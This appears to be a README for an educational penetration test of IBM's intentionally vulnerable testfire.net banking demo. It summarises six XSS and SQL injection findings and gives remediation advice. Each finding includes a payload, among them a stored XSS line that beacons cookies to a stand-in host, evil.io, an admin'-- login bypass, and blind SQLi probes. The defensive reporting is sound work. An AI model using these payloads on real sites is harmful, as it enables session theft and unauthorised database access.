# FUTURE_CS_01
# 🔐 Web Application Penetration Test — AltoroMutual (testfire.net)

![Assessment Type](https://img.shields.io/badge/Type-Black--Box%20Web%20App%20Pentest-red?style=flat-square)
![Scope](https://img.shields.io/badge/Scope-XSS%20%26%20SQLi-orange?style=flat-square)
![OWASP](https://img.shields.io/badge/OWASP-A03%3A2021-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Final%20Report-green?style=flat-square)
![Date](https://img.shields.io/badge/Test%20Date-04%20June%202026-lightgrey?style=flat-square)

> **DISCLAIMER:** `testfire.net` is IBM's intentionally vulnerable demo application, authorised for security testing and educational purposes only. All findings documented here were obtained through ethical, authorised testing. Do not attempt to reproduce these techniques on systems you do not own or have explicit written permission to test.

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | http://testfire.net |
| **Application** | AltoroMutual Online Banking Demo |
| **Test Type** | Black-Box Web Application Security Assessment |
| **Scope** | Cross-Site Scripting (XSS) & SQL Injection (SQLi) |
| **Test Date** | 03–04 June 2026 |
| **Tester** | Mohamed Abdikadir Ahmed |
| **Classification** | CONFIDENTIAL |
| **Report Version** | v1.0 — Final |

---

## 🚨 Vulnerability Summary

| ID | Vulnerability | Severity | CVSS v3.1 | OWASP | Action |
|---|---|---|---|---|---|
| VA-001 | Reflected XSS — `/search.aspx` | 🔴 CRITICAL | 9.6 | A03:2021 | Immediate |
| VA-002 | Stored XSS — `/feedback.aspx` | 🟠 HIGH | 7.4 | A03:2021 | Within 7 days |
| VA-003 | DOM-Based XSS — URL Fragment | 🟠 HIGH | 7.1 | A03:2021 | Within 7 days |
| VA-004 | SQL Injection — Error-Based | 🔴 CRITICAL | 9.8 | A03:2021 | Immediate |
| VA-005 | SQL Injection — UNION-Based | 🔴 CRITICAL | 9.8 | A03:2021 | Immediate |
| VA-006 | SQL Injection — Blind Boolean | 🟡 MEDIUM | 6.5 | A03:2021 | Within 30 days |

**Total: 6 vulnerabilities — 3 Critical · 2 High · 1 Medium**

---

## 🗂️ Repository Structure

```
.
├── README.md                          # This file
├── VULNERABILITY_ASSESSMENT_REPORT.pdf  # Full report (v1.0 Final)
└── evidence/
    ├── VA-001_Reflected_XSS.jpg       # Reflected XSS — session cookie exposure
    ├── VA-002_Stored_XSS.jpg          # Stored XSS — cookie beacon harvesting
    ├── VA-003_DOM_XSS.jpg             # DOM-Based XSS — client-side execution
    ├── VA-004_SQLi_ErrorBased.jpg     # Error-Based SQLi — DB version disclosure
    ├── VA-005_SQLi_UNION.jpg          # UNION-Based SQLi — credential extraction
    └── VA-006_SQLi_BlindBoolean.jpg   # Blind Boolean SQLi — DB name extraction
```

---

## 🔍 Findings Detail

### VA-001 · Reflected XSS — `/search.aspx` · CRITICAL (CVSS 9.6)

The `query` GET parameter is reflected verbatim into the HTML response without encoding. An attacker can craft a malicious URL that, when clicked by a victim, executes arbitrary JavaScript in their browser session — exposing session cookies and enabling full account takeover.

**Payload:** `<script>alert(document.cookie)</script>`  
**Impact:** Session cookie theft → full account takeover

---

### VA-002 · Stored XSS — `/feedback.aspx` · HIGH (CVSS 7.4)

Comment text submitted via the feedback form is stored in the database and rendered to every subsequent visitor without HTML encoding. A persistent payload silently beacons session cookies to an attacker-controlled server.

**Payload:** `<script>new Image().src='https://evil.io/steal?c='+document.cookie</script>`  
**Impact:** Mass session harvesting — every visitor is affected

---

### VA-003 · DOM-Based XSS — URL Fragment · HIGH (CVSS 7.1)

A client-side script reads `location.hash` and passes it directly to `document.write()` without sanitisation. No server interaction is required; the payload never appears in server logs, making it invisible to server-side defences.

**Payload:** `http://testfire.net/default.aspx#lang=<img src=x onerror=alert('DOM-XSS')>`  
**Impact:** Phishing vector distributable via email or social media

---

### VA-004 · SQL Injection (Error-Based) — `/bank/queryxpath.aspx` · CRITICAL (CVSS 9.8)

Appending a single quote to `content_id` triggers a raw Microsoft SQL Server error in the HTTP response, confirming the injectable parameter and exposing the full database engine version.

**Payload:** `content_id=1'`  
**Impact:** Full database enumeration — 3 databases including `altorodb` extracted

---

### VA-005 · SQL Injection (UNION-Based) — `/bank/login.aspx` · CRITICAL (CVSS 9.8)

The login form is vulnerable to authentication bypass via SQL comment termination. The `admin'--` payload eliminates the password check from the query entirely, granting admin access without valid credentials. UNION injection further dumps the full `users` table including password hashes.

**Payload:** `uid=admin'--&passw=anything`  
**Impact:** Admin authentication bypass + full credential extraction

---

### VA-006 · SQL Injection (Blind Boolean) — `/bank/queryxpath.aspx` · MEDIUM (CVSS 6.5)

When verbose error output is suppressed, TRUE/FALSE response differences allow character-by-character database extraction. The database name `altorodb` was fully extracted via 64 boolean inference requests.

**Payload:** `content_id=1' AND SUBSTRING(DB_NAME(),1,1)='a'--`  
**Impact:** Blind data extraction even without error output

---

## 🛠️ Methodology

Testing followed the **OWASP Testing Guide v4.2** and **PTES** across four phases:

```
Reconnaissance → Vulnerability Scanning → Manual Exploitation → Risk Evaluation
```

| Phase | Activity |
|---|---|
| Reconnaissance | Passive crawl, parameter cataloguing, fingerprinting |
| Scanning | OWASP ZAP + Nikto automated scan, false-positive triage |
| Exploitation | Burp Suite Repeater — hand-crafted, escalating payloads |
| Risk Evaluation | CVSS v3.1 scoring + business impact analysis |

**Tools:** Burp Suite Community · OWASP ZAP · SQLMap · Nikto · Firefox DevTools · curl · Python 3 · Hashcat

---

## 🔧 Remediation Summary

### Cross-Site Scripting

| Priority | Fix |
|---|---|
| 🔴 CRITICAL | Output encode all user input — `Server.HtmlEncode()` for HTML, `encodeURIComponent()` for URLs |
| 🔴 CRITICAL | Deploy strict Content Security Policy: `default-src 'self'; script-src 'self'; object-src 'none'` |
| 🟠 HIGH | Server-side allow-list input validation on all parameters |
| 🟠 HIGH | Replace `document.write()` / `innerHTML` with `textContent` / `createElement()` |
| 🟡 MEDIUM | Set `HttpOnly`, `Secure`, and `SameSite=Strict` on all session cookies |

### SQL Injection

| Priority | Fix |
|---|---|
| 🔴 CRITICAL | Replace all string-concatenated SQL with parameterised `SqlCommand` statements |
| 🔴 CRITICAL | Least-privilege DB account — SELECT only; remove `xp_cmdshell`, DROP, ALTER |
| 🟠 HIGH | Strict type validation — `int.TryParse()` for integer parameters |
| 🟠 HIGH | Suppress verbose SQL errors in production; log server-side only |
| 🟡 MEDIUM | Deploy ModSecurity + OWASP Core Rule Set as defence-in-depth |

---

## 📅 Remediation Timeline

| Finding | Severity | Deadline | Est. Effort |
|---|---|---|---|
| VA-001 Reflected XSS | 🔴 CRITICAL | Immediate | 1–2 hours |
| VA-004 Error-Based SQLi | 🔴 CRITICAL | Immediate | 4–8 hours |
| VA-005 UNION-Based SQLi | 🔴 CRITICAL | Immediate | 4–8 hours |
| VA-002 Stored XSS | 🟠 HIGH | 7 days | 2–4 hours |
| VA-003 DOM-Based XSS | 🟠 HIGH | 7 days | 2–4 hours |
| VA-006 Blind Boolean SQLi | 🟡 MEDIUM | 30 days | 4–8 hours |

> ⚠️ **Re-test recommended within 14 days of remediation to verify all fixes.**

---

## ⚖️ Legal & Ethics

This assessment was conducted exclusively on `testfire.net`, IBM's intentionally vulnerable demo application designated for security testing. All testing was authorised. This repository is intended for **educational purposes only**.

**Do not use these techniques against any system without explicit written authorisation.**

---

*Prepared by Mohamed Abdikadir Ahmed · 04 June 2026 · CONFIDENTIAL — distribute only to authorised personnel*
